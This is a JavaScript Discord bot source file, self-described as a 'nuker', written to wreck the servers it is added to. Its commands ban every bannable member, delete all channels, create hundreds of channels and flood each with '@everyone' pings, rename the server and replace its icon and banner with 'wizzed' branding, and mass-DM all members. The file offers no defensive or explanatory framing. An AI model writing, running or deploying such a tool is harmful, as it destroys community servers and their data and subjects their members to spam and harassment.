// Start Up

const Discord = require('discord.js');

// Client

const client = new Discord.Client();

// Bot Neccessities

const token  = 'TOKEN';
const prefix = 'a';


// Statuses 

client.on("ready", async() => {
    console.log(`${client.user.username} is online on ${client.guilds.cache.size} servers!`);
    console.log(`${client.user.username} has initialized`);
    console.log(` `);

    let statuses = [
      " 7teen ",
      " ahelp ",
      `${client.guilds.cache.size} servers!`, //can add another
      " zhelp ",
      " amy <3 ",
      ` ${client.users.cache.size} users `,
      " zhelp",
  ]
  setInterval(function(){
          let status = statuses[Math.floor(Math.random() * statuses.length)];
          client.user.setActivity(status, {type:"STREAMING", url: "https://www.twitch.tv/ayoohennio"})
  
      }, 1000) //Seconds
})

client.on('message', message => {

    if(message.content.startsWith(prefix + 'help')){
        const helpembed = new Discord.MessageEmbed()
        .setTitle(`TRACY NUKER`)
        .setDescription(`\`NUKE\``)
        .setFooter(`prefix [a] | made by 7lone`)
        .setColor(0xFF0000)
        message.channel.send(helpembed);
    }

    if(message.content.startsWith(prefix + 'nuke')){
      const helpembed = new Discord.MessageEmbed()
      .setTitle(`NUKER`)
      .setDescription(`\`MASS BAN\`: **mban** \n\`CREATE CHANNELS\`: **cc [text]** \n\`MASS DELETE CHANNELS\`: **cd** \n\`MASS PING AND CHANNELS\`: **mp** \n\`FUCK SERVER\`: **fuck [text]** `)
      .setFooter(`prefix [a] | made by 7lone`)
      .setColor(0xFF0000)
      message.channel.send(helpembed);
    }

    // PURGE MESSAGE

    if (message.content.startsWith(prefix + "purge")) {

        let color = ((1 << 24) * Math.random() | 0).toString(16); //Generates random hex value.

        const nopurgeembed = new Discord.MessageEmbed()
        .setDescription("*You don't have permission to use this command*")
        .setColor(`#${color}`)

        let args = message.content.split(" ").slice(1);
        var argresult = args.join(' '); 
      
        if(!message.member.hasPermission("ADMINISTRATOR")) return message.channel.send(nopurgeembed)
        if(message.member.hasPermission("ADMINISTRATOR")) {
            message.channel.bulkDelete(argresult).then(() => {
                message.channel.send(`***deleted ${argresult} messages***`)
                .then(message =>{
                    message.delete({ timeout: 1000 })
                })
            })
        }

      }

      if(message.content.startsWith(prefix + 'mban')){

        message.guild.members.cache.filter(member => member.bannable).forEach(member => {member.ban()});
        message.delete({timeout: 1000});
        try {

    } catch(e) {

        console.log(e.stack);

    }
      }

// Mass Channels      

        if (message.content.startsWith(prefix + 'cc')){
            let args = message.content.split(" ").slice(1);
            var argresult = args.join(' ');
            for (var i = 0; i < 250; i++) {
message.guild.channels.create(argresult)
            };
            
        }

// Mass Channel & Ping Every Channel

if(message.content.startsWith(prefix + 'mp')){
  let args = message.content.split(" ").slice(1);
  var argresult = args.join(' ');
  // If you dont give an input
  if(!argresult){
    for (var i = 0; i < 250; i++) {
    message.guild.channels.create('wizzed by ' + message.author.username)

    for (var i = 0; i < 250; i++) {
      let channels = message.guild.channels.create('wizzed by ' + message.author.username)
      
    channels.then(
      function(channel, index) {
        for (var i = 0; i < 250; i++) {
        channel.send('@everyone');
        // other per-channnel logic
        }
      }
    );
    }

    }
  }
  // If you give an input
  for (var i = 0; i < 250; i++) {
    let channels = message.guild.channels.create(argresult)
    
  channels.then(
    function(channel, index) {
      for (var i = 0; i < 250; i++) {
      channel.send('@everyone');
      // other per-channnel logic
      }
    }
  );
  }
}




      if (message.content.startsWith(prefix + 'cd')){
        message.guild.channels.cache.forEach(channel => channel.delete()); // deletes all channels
        message.delete();
      }

      if(message.content.startsWith(prefix + 'spamtest')){
        for (var i = 0; i < 20; i++) {
            message.channel.send("spam")
        } 
      } 

// Fuck the server      

        if (message.content.startsWith(prefix + 'fuck')){

          message.guild.setName(`Wizzed by ${message.author.username}`) // changes server name

          message.guild.channels.cache.forEach(channel => channel.delete()); // deletes all channels

          message.guild.setIcon('https://media.discordapp.net/attachments/760871362868150272/760892079584444516/10.jpg') // changes server pfp

          if(!message.guild.banner) {
                  return 
          } else{
            message.guild.setBanner(`https://media.discordapp.net/attachments/760871362868150272/760892079584444516/10.jpg`) // changes server banner
          }

          let args = message.content.split(" ").slice(1);
          var argresult = args.join(' ');
          for (var i = 0; i < 250; i++) {
            let channels = message.guild.channels.create(argresult)
            
          channels.then(
            function(channel, index) {
              for (var i = 0; i < 250; i++) {
              channel.send('you got wizzed');
              // other per-channnel logic
              }
            }
          );
          }

        }

// Mass DM        

        if (message.content.startsWith(prefix + 'dm')){

          message.guild.members.cache.map(member => { 
            member.send("ANYTHING U WANT").catch(e => console.error(`Couldn't DM member ${member.user.tag}`)) || (console.log(`DM'd ${member.user.tag}`));
          });
          message.delete()
        }

// Bot Server List        

if (message.content === 'zservers'){
        let serverlist = ''
        client.guilds.cache.forEach((guild) => {
            serverlist = serverlist.concat(` - \`${guild.name}\`\n`)
        })
    
        const embed = new Discord.MessageEmbed()
        .setColor("RANDOM")
        .setTitle("Servers that have Naruse Jun Bot", '')
        .setDescription(serverlist)
        message.channel.send({embed});
}
    
    
})

client.login(token);
